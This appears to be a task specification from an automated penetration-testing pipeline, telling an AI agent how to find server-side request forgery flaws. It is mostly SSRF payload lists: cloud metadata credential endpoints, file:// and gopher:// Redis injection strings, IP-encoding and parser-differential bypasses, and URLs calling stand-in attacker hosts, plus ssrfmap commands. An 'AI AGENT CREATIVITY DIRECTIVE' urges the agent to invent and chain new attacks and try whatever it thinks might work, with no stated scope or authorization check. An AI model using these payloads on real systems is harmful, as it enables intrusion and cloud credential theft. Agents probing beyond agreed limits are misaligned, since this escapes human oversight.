@@ -1,0 +1,463 @@
+================================================================================
+TASK 50 — SSRF DETECTION SCANNER
+================================================================================
+Covers testing_toolkit.txt Phase 5 Step 15 (Detection)
+Exploitation → Task 51
+
+OBJECTIVE
+─────────
+Identify Server-Side Request Forgery (SSRF) vulnerabilities by:
+- Scanning URL/redirect/callback parameters
+- Detecting blind SSRF via OOB callbacks (Interactsh)
+- Testing internal network access
+- Identifying protocol handler support
+
+================================================================================
+                              INPUT FILES
+================================================================================
+PRIMARY (high-priority targets):
+  outputs/queue_dynamic_endpoints_urls.txt    ← params to test
+  outputs/arjun_found_params.txt              ← discovered hidden params
+  outputs/api_endpoints_live.txt              ← authenticated API routes
+
+SECONDARY (broaden coverage):
+  outputs/har/common_data.txt                 ← HAR-extracted endpoints
+  outputs/live_base_urls.txt                  ← base URLs
+
+INTELLIGENCE (adaptive testing):
+  outputs/waf_summary.json                    ← WAF bypass selection
+  outputs/nuclei/tech_stack.json              ← tech stack detection
+
+================================================================================
+                             OUTPUT FILES
+================================================================================
+outputs/ssrf/
+├── ssrf_vulnerable.json          ← confirmed SSRF findings
+├── ssrf_blind_confirmed.json     ← blind SSRF via OOB
+├── ssrf_possible.txt             ← likely SSRF (manual verify)
+├── task51_targets.json           ← confirmed SSRFs for exploitation
+├── protocol_support.json         ← supported protocols per endpoint
+├── scan_log.txt                  ← execution log
+└── checkpoint.json               ← resume state
+
+================================================================================
+                         SSRF-LIKELY PARAMETERS
+================================================================================
+HIGH PRIORITY (test first):
+────────────────────────────
+url, uri, path, dest, redirect, target, rurl, return, returnUrl, return_url,
+callback, next, data, reference, site, html, val, validate, domain, feed,
+host, port, to, out, view, dir, show, navigation, open, file, document,
+folder, pg, style, doc, img, filename
+
+MEDIUM PRIORITY:
+────────────────
+source, src, imageURL, image_url, pic, picture, link, href, proxy, fetch,
+load, request, page, pageUrl, api, endpoint, service, webhook, hook,
+pingback, notify, notification, forward, goto
+
+HEADER-BASED SSRF:
+──────────────────
+X-Forwarded-Host, X-Original-URL, X-Rewrite-URL, Host, Referer, Origin,
+X-Custom-IP-Authorization, X-Forwarded-For, X-Real-IP
+
+================================================================================
+                         SSRF DETECTION PAYLOADS
+================================================================================
+
+SECTION 1: LOCALHOST VARIANTS
+─────────────────────────────
+# IPv4 localhost
+http://127.0.0.1
+http://127.0.0.1:80
+http://127.0.0.1:443
+http://127.0.0.1:22
+http://127.0.0.1:8080
+http://127.1
+http://127.000.000.001
+http://2130706433                    ← decimal IP (127.0.0.1)
+http://0x7f000001                    ← hex IP
+http://017700000001                  ← octal IP
+http://0                             ← 0.0.0.0
+http://0.0.0.0
+
+# IPv6 localhost
+http://[::1]
+http://[0000::1]
+http://[::ffff:127.0.0.1]
+http://[0:0:0:0:0:ffff:127.0.0.1]
+
+# DNS-based localhost
+http://localhost
+http://localhost.localdomain
+http://127.0.0.1.nip.io
+http://localtest.me
+http://spoofed.burpcollaborator.net  ← resolves to 127.0.0.1
+
+SECTION 2: INTERNAL NETWORK RANGES
+──────────────────────────────────
+# Class A private
+http://10.0.0.1
+http://10.0.0.1:8080
+http://10.255.255.255
+
+# Class B private
+http://172.16.0.1
+http://172.31.255.255
+
+# Class C private
+http://192.168.0.1
+http://192.168.1.1
+http://192.168.1.254
+
+# Link-local
+http://169.254.0.1
+http://169.254.169.254               ← AWS/GCP metadata
+
+SECTION 3: CLOUD METADATA ENDPOINTS
+───────────────────────────────────
+# AWS (IMDSv1)
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/dynamic/instance-identity/document
+
+# AWS (IPv6)
+http://[fd00:ec2::254]/latest/meta-data/
+
+# GCP
+http://metadata.google.internal/computeMetadata/v1/
+http://169.254.169.254/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+# Azure
+http://169.254.169.254/metadata/instance
+http://169.254.169.254/metadata/identity/oauth2/token
+
+# DigitalOcean
+http://169.254.169.254/metadata/v1/
+
+# Oracle Cloud
+http://169.254.169.254/opc/v1/instance/
+
+# Alibaba Cloud
+http://100.100.100.200/latest/meta-data/
+
+SECTION 4: OOB DETECTION (Interactsh)
+─────────────────────────────────────
+# Replace {INTERACT} with your Interactsh subdomain
+http://{INTERACT}
+http://{INTERACT}/ssrf-test
+http://{INTERACT}:80
+http://{INTERACT}:443
+https://{INTERACT}
+
+# DNS-only (for stricter filters)
+http://ssrf.{INTERACT}
+http://test.{INTERACT}
+
+SECTION 5: PROTOCOL TESTING
+───────────────────────────
+# File protocol (LFI via SSRF)
+file:///etc/passwd
+file:///c:/windows/win.ini
+file://localhost/etc/passwd
+
+# Dict protocol (port scan, info leak)
+dict://127.0.0.1:22/info
+dict://127.0.0.1:6379/info
+
+# Gopher protocol (full control - see Task 51)
+gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a
+
+# FTP protocol
+ftp://127.0.0.1/
+ftp://attacker.com/file
+
+# LDAP protocol
+ldap://127.0.0.1:389/%0astatus
+
+# TFTP protocol
+tftp://attacker.com/file
+
+SECTION 6: BYPASS TECHNIQUES
+────────────────────────────
+# URL encoding
+http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
+http://localhost → http://%6c%6f%63%61%6c%68%6f%73%74
+
+# Double URL encoding
+http://127.0.0.1 → http://%25%33%31%25%33%32%25%33%37...
+
+# DNS rebinding
+http://attacker-controlled-domain.com    ← resolves to 127.0.0.1
+
+# Redirect bypass
+http://attacker.com/redirect?url=http://127.0.0.1
+
+# Parser differential
+http://127.0.0.1#@attacker.com
+http://attacker.com@127.0.0.1
+http://127.0.0.1%00@attacker.com
+http://127.0.0.1%23@attacker.com
+
+# Case manipulation
+http://LOCALHOST
+http://LocalHost
+
+# Bracket tricks
+http://127.0.0.1]/
+http://127。0。0。1                    ← fullwidth dots
+
+# URL fragment
+http://attacker.com#http://127.0.0.1
+
+# Authority confusion
+http://127.0.0.1:80:80:80/
+
+================================================================================
+                              TOOL COMMANDS
+================================================================================
+
+SSRFmap (primary):
+──────────────────
+# Basic scan
+ssrfmap -r request.txt -p url -m readfiles
+
+# With custom payload
+ssrfmap -r request.txt -p url -m portscan --lhost 127.0.0.1 --lport 1-1000
+
+# Cloud metadata
+ssrfmap -r request.txt -p url -m aws
+
+SSRFire (alternative):
+──────────────────────
+# Scan URL parameter
+python ssrfire.py -u "https://target.com/fetch?url=FUZZ"
+
+# With wordlist
+python ssrfire.py -u "https://target.com/fetch?url=FUZZ" -w ssrf_payloads.txt
+
+Interactsh (OOB listener):
+──────────────────────────
+# Start listener
+interactsh-client -v
+
+# Get subdomain: abc123.oast.fun
+# Use in payloads: http://abc123.oast.fun/ssrf-test
+
+================================================================================
+                        DETECTION SIGNATURES
+================================================================================
+
+POSITIVE INDICATORS (SSRF confirmed):
+─────────────────────────────────────
+- Response contains internal service data (Redis info, SSH banner)
+- Response shows localhost HTML/content
+- OOB callback received on Interactsh
+- Cloud metadata content returned
+- File contents returned (file:// protocol)
+- Different response for internal vs external IPs
+- Error messages revealing internal IPs/hostnames
+
+ERROR-BASED DETECTION:
+──────────────────────
+- "Connection refused" for internal IP (service down but reachable)
+- "Connection timed out" vs immediate failure (network filtering)
+- "Name resolution failed" for .internal domains
+- Stack traces showing URL fetching code
+
+RESPONSE TIME-BASED:
+────────────────────
+- Faster response for localhost (no network latency)
+- Slower response for internal IPs (routing)
+- Timeout differences for blocked vs allowed
+
+================================================================================
+                         EXECUTION WORKFLOW
+================================================================================
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ STEP 1: Start OOB Listener                                                  │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ • Start interactsh-client                                                   │
+│ • Record assigned subdomain (e.g., abc123.oast.fun)                         │
+│ • This runs in background for entire scan                                   │
+└─────────────────────────────────────────────────────────────────────────────┘
+                                    ↓
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ STEP 2: Load & Classify Targets                                             │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ • Load queue_dynamic_endpoints_urls.txt                                     │
+│ • Load api_endpoints_live.txt                                               │
+│ • Identify SSRF-likely parameters (url, redirect, callback, etc.)           │
+│ • Prioritize by parameter name                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+                                    ↓
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ STEP 3: Basic SSRF Testing                                                  │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ FOR each SSRF candidate:                                                    │
+│   a) Get baseline response (normal URL value)                               │
+│   b) Test localhost variants (127.0.0.1, [::1], etc.)                       │
+│   c) Test internal ranges (10.x, 172.16.x, 192.168.x)                       │
+│   d) Test OOB callback (Interactsh URL)                                     │
+│   e) Compare responses for indicators                                       │
+└─────────────────────────────────────────────────────────────────────────────┘
+                                    ↓
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ STEP 4: Cloud Metadata Testing                                              │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ FOR confirmed/possible SSRF:                                                │
+│   a) Test AWS metadata: 169.254.169.254/latest/meta-data/                   │
+│   b) Test GCP metadata: metadata.google.internal                            │
+│   c) Test Azure metadata: 169.254.169.254/metadata/instance                 │
+│   d) Record if metadata accessible → HIGH SEVERITY                          │
+└─────────────────────────────────────────────────────────────────────────────┘
+                                    ↓
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ STEP 5: Protocol Support Testing                                            │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ FOR confirmed SSRF:                                                         │
+│   a) Test file:// protocol                                                  │
+│   b) Test dict:// protocol                                                  │
+│   c) Test gopher:// protocol                                                │
+│   d) Record supported protocols → feeds Task 51                             │
+└─────────────────────────────────────────────────────────────────────────────┘
+                                    ↓
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ STEP 6: Output & Feed Task 51                                               │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ • Write ssrf_vulnerable.json                                                │
+│ • Write ssrf_blind_confirmed.json                                           │
+│ • Write task51_targets.json (for exploitation)                              │
+│ • Generate severity ratings                                                 │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+================================================================================
+                     AI AGENT CREATIVITY DIRECTIVE
+================================================================================
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                    🧠 YOU ARE AN INTELLIGENT AGENT 🧠                       │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ The payloads above are STARTING POINTS, not a complete list.                │
+│ Your job is to THINK, ADAPT, and CREATE based on what you observe.          │
+│                                                                             │
+│ OBSERVE → ANALYZE → ADAPT → INVENT                                          │
+│                                                                             │
+│ 1. OBSERVE: What happens when you send a payload?                           │
+│    - Response time change? (internal service responding)                    │
+│    - Error message? (reveals backend URL handling)                          │
+│    - Different status code? (validation triggered)                          │
+│    - Content length difference? (partial fetch success)                     │
+│                                                                             │
+│ 2. ANALYZE: Why did it behave that way?                                     │
+│    - Is there domain whitelisting? (try subdomains, DNS rebinding)          │
+│    - Is there protocol filtering? (http only? try redirect chains)          │
+│    - Is there IP blacklisting? (try encoding variants, IPv6)                │
+│    - What library fetches URLs? (curl? requests? libxml?)                   │
+│                                                                             │
+│ 3. ADAPT: Modify payloads based on your analysis                            │
+│    - If domain whitelist: evil.allowed-domain.com, allowed-domain.com@evil  │
+│    - If IP blacklist: Use DNS rebinding, decimal/hex/octal encoding         │
+│    - If protocol filter: Find open redirect on allowed domain               │
+│                                                                             │
+│ 4. INVENT: Create NEW payloads not in any list                              │
+│    - Combine multiple bypass techniques                                     │
+│    - Use application-specific knowledge                                     │
+│    - Chain with other vulns (open redirect, CRLF injection)                 │
+│                                                                             │
+│ TRUST YOUR REASONING. If you think something might work, TRY IT.            │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+CONTEXT-AWARE THINKING:
+───────────────────────
+Before testing, ASK YOURSELF:
+
+• What is this parameter SUPPOSED to do?
+  - url/callback → fetches external content
+  - redirect/next → browser redirect (maybe server-side)
+  - image/avatar → image fetching (maybe server-side resize)
+  - webhook → server sends request to user-provided URL
+  
+• What validation is LIKELY present?
+  - URL must start with https:// → try protocol-relative //evil.com
+  - Domain must be example.com → try example.com.evil.com
+  - IP 127.0.0.1 blocked → try 2130706433 (decimal)
+
+• What is the BACKEND technology?
+  - Java: URL class has different parsing than Python requests
+  - PHP: parse_url() has quirks with @ and #
+  - Node: new URL() behaves differently from urllib
+  - Identify library from error messages or headers
+
+CHAIN ATTACK THINKING:
+──────────────────────
+SSRF rarely exists alone. Think about CHAINS:
+
+• Open Redirect → SSRF
+  If domain whitelist exists but app has open redirect:
+  https://allowed.com/redirect?url=http://127.0.0.1
+  
+• SSRF → Cloud Credentials
+  Any SSRF in AWS/GCP/Azure → target metadata endpoint
+  
+• SSRF → Internal Service Exploitation
+  SSRF + gopher:// → Redis/Memcached/SMTP command injection
+  
+• SSRF → Internal Network Mapping
+  Use response time/size to map internal network
+
+THINK LIKE THE DEVELOPER:
+─────────────────────────
+Typical URL fetching code:
+
+```python
+# Vulnerable
+url = request.params['url']
+response = requests.get(url)
+return response.content
+
+# With validation (what you need to bypass)
+url = request.params['url']
+if not url.startswith('https://allowed-domain.com'):
+    return error
+response = requests.get(url)
+```
+
+Bypass strategies:
+- https://allowed-domain.com@attacker.com
+- https://allowed-domain.com.attacker.com
+- https://attacker.com#https://allowed-domain.com
+- https://attacker.com/redirect?to=http://127.0.0.1
+
+================================================================================
+                              CHECKPOINT/RESUME
+================================================================================
+checkpoint.json format:
+{
+  "last_target_index": 150,
+  "interactsh_subdomain": "abc123.oast.fun",
+  "oob_callbacks_received": ["callback1", "callback2"],
+  "confirmed_ssrf": 3,
+  "timestamp": "2026-01-13T10:30:00Z"
+}
+
+================================================================================
+                             9-MINUTE BATCHING
+================================================================================
+- Process 30 targets per batch (SSRF testing is slower)
+- Check Interactsh for OOB callbacks after each batch
+- Write outputs after each batch
+- Checkpoint every batch
+- Total timeout: 8 minutes active + 1 minute output
+
+================================================================================
+                                  NOTES
+================================================================================
+- ALWAYS start Interactsh FIRST (OOB detection is crucial for blind SSRF)
+- Cloud metadata SSRF is HIGH SEVERITY (credential theft)
+- gopher:// protocol enables exploitation → Task 51
+- Many SSRFs are BLIND - no response, only OOB callback
+- DNS rebinding requires attacker-controlled domain
+================================================================================
